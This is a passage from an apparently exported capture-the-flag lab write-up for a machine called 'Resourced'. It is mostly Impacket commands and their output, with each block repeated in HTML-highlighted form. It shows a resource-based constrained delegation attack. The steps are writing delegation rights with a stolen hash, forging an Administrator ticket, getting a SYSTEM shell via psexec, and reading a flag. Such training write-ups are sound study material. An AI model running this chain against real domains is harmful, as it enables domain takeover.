+[*] <span class="hljs-title function_">Successfully</span> <span class="hljs-title function_">added</span> <span class="hljs-title function_">machine</span> <span class="hljs-title function_">account</span> <span class="hljs-title function_">ATTACKERSYSTEM</span>$ <span class="hljs-title function_">with</span> <span class="hljs-title function_">password</span> <span class="hljs-title function_">Summer2018</span>!.</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ rbcd.py -delegate-from &apos;ATTACKERSYSTEM$&apos; -delegate-to &apos;RESOURCEDC$&apos; -action &apos;write&apos; &apos;resourced.local/l.livingstone&apos; -hashes :19a3a7550ce8c505c2d46b5e39d6f808
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ATTACKERSYSTEM$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     ATTACKERSYSTEM$   (S-1-5-21-537427935-490066102-1511301751-4101)
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ rbcd.py -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&apos;ATTACKERSYSTEM$&apos;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&apos;RESOURCEDC$&apos;</span> -action <span class="hljs-string">&apos;write&apos;</span> <span class="hljs-string">&apos;resourced.local/l.livingstone&apos;</span> -hashes :<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808
+Impacket v0.<span class="hljs-number">13.0</span> - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity <span class="hljs-keyword">is</span> <span class="hljs-keyword">empty</span>
+[*] Delegation rights modified successfully!
+[*] ATTACKERSYSTEM$ can now impersonate users <span class="hljs-keyword">on</span> RESOURCEDC$ via S4U2Proxy
+[*] Accounts allowed <span class="hljs-keyword">to</span> act <span class="hljs-keyword">on</span> behalf <span class="hljs-keyword">of</span> other identity:
+[*]     ATTACKERSYSTEM$   (S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">537427935</span>-<span class="hljs-number">490066102</span>-<span class="hljs-number">1511301751</span>-<span class="hljs-number">4101</span>)
+</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ getST.py -spn &apos;cifs/RESOURCEDC.resourced.local&apos; -impersonate &apos;Administrator&apos; &apos;resourced/attackersystem$:Summer2018!&apos; -dc-ip 192.168.229.175</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span><span class="hljs-title class_">Labs</span>/<span class="hljs-title class_">Resourced</span>]
+&boxur;&boxh;<span class="hljs-variable">$ </span>getST.py -spn <span class="hljs-string">&apos;cifs/RESOURCEDC.resourced.local&apos;</span> -impersonate <span class="hljs-string">&apos;Administrator&apos;</span> <span class="hljs-string">&apos;resourced/attackersystem$:Summer2018!&apos;</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">229.175</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ export KRB5CCNAME=./Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ export KRB5CCNAME=./Administrator<span class="hljs-symbol">@cifs_RESOURCEDC</span>.resourced.<span class="hljs-keyword">local</span><span class="hljs-symbol">@RESOURCED</span>.<span class="hljs-keyword">LOCAL</span>.ccache
+</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on resourcedc.resourced.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file TWlfwqhR.exe
+[*] Opening SVCManager on resourcedc.resourced.local.....
+[*] Creating service OKYL on resourcedc.resourced.local.....
+[*] Starting service OKYL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2145]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Resourced]</span>
+&boxur;&boxh;$ sudo impacket-psexec -k -no-pass resourcedc<span class="hljs-selector-class">.resourced</span><span class="hljs-selector-class">.local</span>
+Impacket v0.<span class="hljs-number">13.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> Requesting shares on resourcedc<span class="hljs-selector-class">.resourced</span><span class="hljs-selector-class">.local</span>.....
+<span class="hljs-selector-attr">[*]</span> Found writable share ADMIN$
+<span class="hljs-selector-attr">[*]</span> Uploading file TWlfwqhR<span class="hljs-selector-class">.exe</span>
+<span class="hljs-selector-attr">[*]</span> Opening SVCManager on resourcedc<span class="hljs-selector-class">.resourced</span><span class="hljs-selector-class">.local</span>.....
+<span class="hljs-selector-attr">[*]</span> Creating service OKYL on resourcedc<span class="hljs-selector-class">.resourced</span><span class="hljs-selector-class">.local</span>.....
+<span class="hljs-selector-attr">[*]</span> Starting service OKYL.....
+<span class="hljs-selector-attr">[!]</span> Press help <span class="hljs-keyword">for</span> extra shell commands
+Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.17763.2145]</span>
+(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt;</code></pre></div>
+<p>The flags:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop&gt; more local.txt
+b30f0d2e104fe4b2cb942ad7089732f4
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop&gt; 
+</pre><pre class="hljs"><code>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\L.Livingstone\Desktop&gt; more <span class="hljs-keyword">local</span>.txt
+b30f0d2e104fe4b2cb942ad7089732f4
+
+*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\L.Livingstone\Desktop&gt; 
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
